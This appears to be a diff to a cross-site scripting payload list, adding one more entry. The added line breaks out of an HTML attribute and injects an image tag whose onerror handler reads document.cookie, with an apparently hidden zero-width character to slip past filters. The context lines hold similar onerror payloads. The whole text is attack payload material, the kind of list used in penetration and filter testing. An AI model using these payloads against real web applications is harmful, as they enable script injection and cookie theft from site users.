@@ -35,3 +35,6 @@
 <h1><img/src=x onerror=alert(1)></h1>
 
 <Img Src=OnXSS OnError=(alert)(1)>
+
+'"><img src=x onerror​="alert(document.cookie)">
+
